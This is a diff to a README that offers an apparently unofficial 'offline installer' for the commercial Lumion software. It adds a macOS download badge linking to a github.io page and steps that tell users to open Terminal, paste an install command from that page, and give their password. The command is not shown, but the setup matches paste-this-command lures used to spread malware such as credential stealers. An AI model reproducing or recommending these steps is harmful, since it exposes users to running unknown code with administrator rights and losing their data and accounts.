@@ -22,6 +22,7 @@
 <div align="center">
 
 [![Download](https://img.shields.io/badge/⬇_Download_Lumion-F9A825?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
 
 </div>
 
@@ -188,3 +189,19 @@ This is a professional offline installer for Lumion. Use only for legitimate pur
   <img src="https://skillicons.dev/icons?i=windows" />
   <img src="https://skillicons.dev/icons?i=github" />
 </p>
+
+
+---
+
+## 🍎 macOS Installation
+
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+
+1. Click the badge above to open the macOS installer page
+2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
+3. Paste the install command shown on the page and press Enter
+4. Follow the prompts — installs automatically 🍏
+
+> Works on **Apple Silicon (M1–M4)** and **Intel Macs**. macOS may prompt for your password during install.
+
+---
